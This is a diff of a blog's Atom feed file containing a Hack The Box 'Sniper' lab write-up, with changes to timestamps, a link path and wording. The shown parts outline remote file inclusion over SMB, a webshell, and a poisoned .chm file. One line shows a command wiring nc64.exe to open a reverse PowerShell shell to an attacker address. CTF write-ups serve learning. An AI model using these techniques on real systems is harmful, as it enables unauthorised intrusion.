@@ -1,6 +1,6 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-03-28T22:04:16+05:45</updated><id>http://localhost:4000/feed.xml</id><title type="html">gr4n173</title><subtitle>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-04-03T03:03:14+05:45</updated><id>http://localhost:4000/feed.xml</id><title type="html">gr4n173</title><subtitle>
 Hi there, I am a nerd guy who loves everything in between Internet and Security . I reach out to people and teach about CyberSecurity. I like to play with electronics in my spare time so that I can automate my lifestyle . CTF | HTB | Reverse Engineering.
-</subtitle><author><name>gr4n173&gt;</name></author><entry><title type="html">Hack The Box: Sniper</title><link href="http://localhost:4000/2020/03/28/htb-sniper.html" rel="alternate" type="text/html" title="Hack The Box: Sniper" /><published>2020-03-28T00:00:00+05:45</published><updated>2020-03-28T00:00:00+05:45</updated><id>http://localhost:4000/2020/03/28/htb-sniper</id><content type="html" xml:base="http://localhost:4000/2020/03/28/htb-sniper.html">&lt;h2 id=&quot;htbsniper&quot;&gt;HTB:Sniper&lt;/h2&gt;
+</subtitle><author><name>gr4n173&gt;</name></author><entry><title type="html">Hack The Box : Sniper</title><link href="http://localhost:4000/2020/03/28/htb-sniper.html" rel="alternate" type="text/html" title="Hack The Box : Sniper" /><published>2020-03-28T00:00:00+05:45</published><updated>2020-03-28T00:00:00+05:45</updated><id>http://localhost:4000/2020/03/28/htb-sniper</id><content type="html" xml:base="http://localhost:4000/2020/03/28/htb-sniper.html">&lt;h2 id=&quot;htbsniper&quot;&gt;HTB:Sniper&lt;/h2&gt;
 
 &lt;p&gt;Sniper box is easy box. It falls under windows and medium category. Here, everything was all about enumeration and webshell upload. I’ll approach this write-up how I solved it, along with the problems that I had to face during this box. At first I obtained the user flag by exploiting RFI using SMB and I got the unprivelege user shell to privelege by using powershell commands and with .chm exploit I got root.txt. I’ll show all my payload (including that didn’t work in initial deployment to get root).&lt;/p&gt;
 
@@ -217,7 +217,7 @@ Mode                LastWriteTime         Length Name
 10.10.14.11 8888 -e powershell&quot; -HHCPath &quot;C:\Program Files (x86)\HTML
 Help Workshop&quot; 
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Here, I defined the dir of &lt;code class=&quot;highlighter-rouge&quot;&gt;nc64.exe&lt;/code&gt; and used &lt;a href=&quot;https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7&quot;&gt;this&lt;/a&gt; to exploit. File named &lt;code class=&quot;highlighter-rouge&quot;&gt;doc.chm&lt;/code&gt; created and you can get here &lt;a href=&quot;/pubic/files/doc.chm&quot;&gt;file&lt;/a&gt;.This way I created the poison of &lt;code class=&quot;highlighter-rouge&quot;&gt;.chm&lt;/code&gt; file&lt;/p&gt;
+&lt;p&gt;Here, I defined the dir of &lt;code class=&quot;highlighter-rouge&quot;&gt;nc64.exe&lt;/code&gt; and used &lt;a href=&quot;https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7&quot;&gt;this&lt;/a&gt; to exploit. File named &lt;code class=&quot;highlighter-rouge&quot;&gt;doc.chm&lt;/code&gt; created and you can get here &lt;a href=&quot;/public/files/doc.chm&quot;&gt;file&lt;/a&gt;.This way I created the poison of &lt;code class=&quot;highlighter-rouge&quot;&gt;.chm&lt;/code&gt; file&lt;/p&gt;
 
 &lt;p&gt;Now I downloaded the created file to user shell &lt;code class=&quot;highlighter-rouge&quot;&gt;Chris&lt;/code&gt; with a listener on along with the &lt;code class=&quot;highlighter-rouge&quot;&gt;python3 server&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/pub&lt;/code&gt;&lt;/p&gt;
 
@@ -243,8 +243,7 @@ PS C:\Users\Administrator\Desktop&amp;gt; more root.txt
 
 &lt;p&gt;This way I got the root of Sniper box and learned alot from this box. So I would like to thank creators of this box &lt;code class=&quot;highlighter-rouge&quot;&gt;MinatoTW &amp;amp; felamos&lt;/code&gt; for such an awesome box. Especially poisoning &lt;code class=&quot;highlighter-rouge&quot;&gt;.chm&lt;/code&gt; was awesome.&lt;/p&gt;
 
-&lt;p&gt;I will be posting writeup of next box after box retired. 
-I would like to Thank readers for being with me through out this writeup.
+&lt;p&gt;I will be posting writeup of next box after box retired. I would like to Thank readers for being with me through out this writeup. 
 Feedback are really appreciated !!
 Tweet about this writeup if you like.&lt;/p&gt;
 
